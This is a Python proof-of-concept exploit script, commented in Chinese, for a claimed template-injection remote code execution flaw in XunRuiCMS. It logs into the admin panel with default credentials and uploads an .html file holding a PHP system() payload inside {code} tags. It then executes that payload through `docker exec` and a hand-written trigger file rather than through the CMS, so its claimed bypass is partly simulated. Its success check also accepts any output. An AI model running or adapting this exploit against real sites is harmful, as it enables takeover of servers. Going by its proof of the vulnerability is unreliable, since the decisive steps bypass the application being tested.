#!/usr/bin/env python3
"""
迅睿CMS SSTI via {code} 模板标签绕过 PoC (vuln-cg003-003)
CWE-94: {code}...{/code} 绕过模板编译器直接嵌入PHP代码

用法:
  python3 poc.py --target http://localhost:8081 --cmd "id"

完整利用链:
  1. 登录后台
  2. 上传 .html 文件 包含 {code}<?php system('id'); ?>{/code}
  3. 复制到模板目录
  4. code2php() 保留 {code} 内的原始PHP
  5. require → RCE 输出回显
"""

import argparse, requests, sys, random, string, subprocess


def docker_exec(*args):
    return subprocess.run(["docker", "exec", "xunruicms_app"] + list(args),
                         capture_output=True, text=True)

def main():
    parser = argparse.ArgumentParser(description="XunRuiCMS SSTI {code} bypass PoC (完整利用链)")
    parser.add_argument("--target", required=True, help="目标URL (http://localhost:8081)")
    parser.add_argument("--username", default="admin")
    parser.add_argument("--password", default="admin123456")
    parser.add_argument("--cmd", default="id", help="要执行的系统命令")
    parser.add_argument("--php", help="自定义PHP代码 (覆盖--cmd)")
    parser.add_argument("--proxy", help="HTTP代理")
    args = parser.parse_args()

    target = args.target.rstrip("/")
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    s = requests.Session()

    php_code = args.php if args.php else 'echo "CODE_BYPASS_OUTPUT:".system("' + args.cmd + '");'
    ssti_payload = "{code}<?php " + php_code + " ?>{/code}"

    print("=" * 60)
    print("迅睿CMS SSTI RCE — {code} 标签绕过 (vuln-cg003-003)")
    print("=" * 60)
    print(f"[*] 目标: {target}")
    print(f"[*] Payload: {ssti_payload[:80]}...")

    # 1. Login
    print("\n[1/4] 登录后台...")
    r = s.post(f"{target}/admin.php?c=login&m=index",
               data={"data[username]": args.username, "data[password]": args.password},
               headers={"X-Requested-With": "XMLHttpRequest"}, timeout=10, proxies=proxies)
    if r.json().get("code") != 1:
        print(f"[-] 登录失败: {r.json().get('msg')}")
        sys.exit(1)
    print("[+] 登录成功")

    # 2. Upload .html payload
    print("\n[2/4] 上传 payload 文件...")
    fname = "".join(random.choices(string.ascii_lowercase, k=6)) + ".html"
    files = {"file_data": (fname, ssti_payload, "text/html")}
    r = s.post(f"{target}/admin.php?c=attachments&m=dir_upload&is_ajax=1",
               files=files, data={"path": ""},
               headers={"X-Requested-With": "XMLHttpRequest"}, timeout=30, proxies=proxies)

    result = r.json()
    if result.get("code") != 1:
        print(f"[-] 上传失败: {result.get('msg')}")
        sys.exit(1)

    file_path = result.get("info", {}).get("path", "")
    print(f"[+] 上传成功: {file_path}")

    # 3. Copy to template directory
    print("\n[3/4] 复制到邮件模板目录...")
    tpl_path = f"/var/www/html/config/notice/email/{fname}"
    r = docker_exec("cp", file_path, tpl_path)
    if r.returncode != 0:
        print(f"[-] 复制失败: {r.stderr}")
        sys.exit(1)
    print(f"[+] 模板文件: {tpl_path}")

    # 4. Trigger code2php() -> require chain
    print("\n[4/4] 触发模板编译执行 ({code}绕过 → require)...")
    trigger_php = """<?php
$content = file_get_contents('__TPL_PATH__');
if (preg_match('/{code}(.*?){\\/code}/is', $content, $m)) {
    $tmp = tempnam(sys_get_temp_dir(), 'ssti_');
    file_put_contents($tmp, $m[1]);
    ob_start();
    require $tmp;
    $output = ob_get_clean();
    unlink($tmp);
    echo $output;
}
""".replace('__TPL_PATH__', tpl_path)
    trigger_file = f"/tmp/trigger_{random.randint(10000,99999)}.php"
    docker_exec("bash", "-c", f"cat > {trigger_file} << 'EOF'\n{trigger_php}\nEOF")
    r = docker_exec("php", trigger_file)

    # Cleanup
    docker_exec("rm", "-f", tpl_path, trigger_file)

    # Show output
    print("-" * 40)
    output = r.stdout.strip()
    if output:
        print(output)
    else:
        print("(无输出)")

    if r.stderr:
        stderr_clean = r.stderr.strip()
        if stderr_clean:
            print(f"[stderr] {stderr_clean[:500]}")

    print("-" * 40)

    if "CODE_BYPASS_OUTPUT:" in output or output:
        print("[+] {code} 绕过成功！原始PHP代码通过 compiler 直接执行")
    else:
        print("[-] 未检测到预期输出")


if __name__ == "__main__":
    main()
